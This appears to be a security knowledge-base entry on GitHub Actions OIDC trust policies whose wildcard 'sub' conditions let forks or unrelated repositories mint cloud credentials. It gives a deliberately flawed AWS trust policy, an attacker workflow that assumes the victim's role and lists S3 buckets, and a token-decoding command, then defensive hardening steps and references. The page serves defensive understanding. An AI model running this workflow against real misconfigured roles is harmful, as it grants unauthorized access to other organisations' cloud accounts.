---
title: GitHub Actions OIDC sub-claim wildcards
slug: gha-oidc-sub-claim-wildcards
---

> **TL;DR:** Trust policies that match the GitHub OIDC `sub` claim with `repo:org/*` or no `repository_owner_id` end up trusting forks, public PRs, and unrelated repos — anyone who can run a workflow there mints cloud credentials.

## What it is
GitHub Actions issues an OIDC JWT to a workflow run, which AWS / Azure / GCP / Vault can federate against to hand back short-lived cloud creds. The trust policy on the cloud side decides which workflows it accepts, primarily by matching the `sub` claim of the form `repo:<org>/<repo>:ref:refs/heads/<branch>` (or `:pull_request`, `:environment:<env>`). Operators routinely write `repo:my-org/*:ref:refs/heads/main` thinking it scopes to one org, but `StringLike` on a wildcard tail lets a fork that names itself cleverly satisfy the condition. Worse patterns: `sub` of `repo:*` (accept any repo on GitHub), or omitting `sub` entirely and only checking the audience.

## Preconditions / where it applies
- Cloud federation set up with GitHub's OIDC provider (`token.actions.githubusercontent.com`) on AWS / Azure / GCP / HashiCorp Vault.
- Trust policy uses `StringLike` with wildcards, or only checks `aud`, or matches on `repository_owner` only by name (not `repository_owner_id`, which is immutable).
- Attacker can run a workflow under a `sub` value that matches the wildcard — could be a fork, a new repo in the same org, or any GitHub repo if the wildcard is too open.

## Technique
1. Read the cloud trust policy (sometimes leaked, sometimes inferable).
2. Find a `sub` shape that satisfies it without being the intended workflow.
3. Run a workflow that requests an OIDC token and uses it to assume the role.

```json
// Bad AWS trust policy — accepts any repo in the org, any branch
{
  "Federated": "arn:aws:iam::1111:oidc-provider/token.actions.githubusercontent.com",
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:my-org/*"
    },
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
    }
  }
}
```

```yaml
# In ANY repo that satisfies the wildcard
permissions:
  id-token: write
  contents: read
jobs:
  pwn:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::1111:role/deployer
          aws-region: us-east-1
      - run: aws sts get-caller-identity && aws s3 ls
```

```bash
# Decode an OIDC token to see what sub the run actually presents
curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
     "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" \
  | jq -r .value | cut -d. -f2 | base64 -d 2>/dev/null
```

Adjacent footguns: matching by `repository_owner` (an attacker can rename their org); using the deprecated `actor` claim (anyone can become an actor on a public repo); accepting `:pull_request` from forked PRs.

## Detection and defence
- Always pin `sub` to a fully qualified value or use `StringEquals` (not `StringLike`), and add `repository_owner_id` / `repository_id` (numeric, immutable) as additional conditions.
- Constrain to specific refs (`ref:refs/heads/main`, `environment:prod`) and enable required reviewers on protected environments.
- Periodically scan IaC repos for federation trust policies and audit the conditions block.
- Related: [[aws-iam-enum]], [[aws-organisations-abuse]].

## References
- [Tinder Security — Identifying vulnerabilities in GitHub Actions / AWS OIDC](https://medium.com/tinder/identifying-vulnerabilities-in-github-actions-aws-oidc-configurations-8067c400d5b8) — concrete misconfig patterns at scale.
- [Praetorian — Hijacking GitHub Actions deployment pipelines via OIDC](https://www.praetorian.com/blog/whose-misconfigured-iam-role-is-it-anyway/) — escalation chains in AWS.
- [GitHub docs — About security hardening with OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect) — claim shape and recommended conditions.
